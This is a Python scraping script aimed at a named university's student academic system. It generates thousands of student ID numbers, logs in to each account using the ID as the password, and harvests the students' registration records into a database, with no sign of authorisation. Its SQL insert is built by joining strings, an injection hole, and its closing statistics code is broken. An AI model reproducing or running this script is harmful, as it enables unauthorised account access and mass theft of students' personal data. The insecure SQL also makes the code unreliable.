# -*- coding: utf-8 -*-
"""
@author:JamesZBL
Created on:18-2-7 12:00
"""

import requests
import gevent
import time
from lxml import etree
from URPScrapy import db_init

URL_LOGIN = 'http://lgjwxt.hebust.edu.cn/loginAction.do'
URL_LOGOUT = 'http://lgjwxt.hebust.edu.cn/logout.do?loginType=platformLogin'
URL_XJXX = 'http://lgjwxt.hebust.edu.cn/xjInfoAction.do?oper=xjxx'


class statistic_repo:
	sum = 0
	sum_valid = 0
	sum_get = 0

	@classmethod
	def sum_r(cls):
		statistic_repo.sum += 1

	@classmethod
	def sum_get_r(cls):
		statistic_repo.sum_get += 1

	@classmethod
	def sum_valid_r(cls):
		statistic_repo.sum_valid += 1


class info_repo:
	index = 0
	info = []

	@classmethod
	def get_account(cls):
		i = cls.info[cls.index]
		cls.index += 1
		return i


class db_repo:
	conn = db_init.connect_db()

	@classmethod
	def get_db_conn(cls):
		return cls.conn


def main():
	conn = db_init.connect_db()
	grade = 15
	separator = 'L'
	college = ['01', '02', '03', '04', '05', '06', '07']
	sub = ['51', '52']
	# 开始获取信息
	for c in college:
		for s in sub:
			pre = str(grade) + separator + c + s
			for i in range(1, 300):
				username = pre + str(i).zfill(3)
				info_repo.info.append(username)

	# 完成
	conn.close()
	for i in info_repo.info:
		gevent.spawn(getinfo).join()

	print('既定数据获取完成，尝试获取总数：{}，成功获取总数：{}'.format(statistic_repo.sum_valid_r, statistic_repo.sum_get_r))
	print("获取成功率为：%.2f%%" % ((statistic_repo.sum_get_r / statistic_repo.sum_valid_r) * 100))


def getinfo():
	statistic_repo.sum_r()
	# 获取参数
	info = info_repo.get_account()
	conn = db_repo.get_db_conn()
	# 请求参数
	param = {"zjh": info, "mm": info}
	print('证件号: {}\n密  码: {}'.format(info, info))
	# 发送登录请求
	# response = pool.request('GET', URL_LOGIN, fields=param)
	# res_text = response.data.decode('GB2312')
	# res_header = response.status
	# print(res_header)
	session = requests.session()
	response = session.get(URL_LOGIN, params=param)
	print('发送请求>>{}'.format(response.url))
	res_text = response.text

	# 密码有误
	if res_text.__contains__('密码不正确'):
		print('密码不正确')
		session.close()
		statistic_repo.sum_valid_r()
		return 1
	# 证件号无效
	if res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
		print('证件号不存在')
		session.close()
		return 2
	print('登录成功')
	time.sleep(1)
	# 获取学籍信息
	reqXJXX = session.get(URL_XJXX)
	# 注销登录
	session.post(URL_LOGOUT)
	# 结束会话
	session.close()
	print('发送请求>>{}'.format(reqXJXX.url))
	# 获取相应内容
	text = reqXJXX.text
	selector = etree.HTML(text)
	textarr = selector.xpath('//td[starts-with(@width,"275")]/text()')
	result = []
	for info in textarr:
		result.append(info.strip())
	save_info(conn, result)
	statistic_repo.sum_get_r()
	return 0


def save_info(conn, info):
	sql_str = 'INSERT INTO URP_INFO_HEBUST_LG VALUES (NULL ,'
	for i in info:
		sql_str += "\'" + str(i) + "\'" + ','
	sql_str = sql_str[0:sql_str.__len__() - 1]
	sql_str += ")"
	print(sql_str)
	conn.cursor().execute(sql_str)
	conn.commit()


def sleep():
	time.sleep(5)


if __name__ == '__main__':
	main()
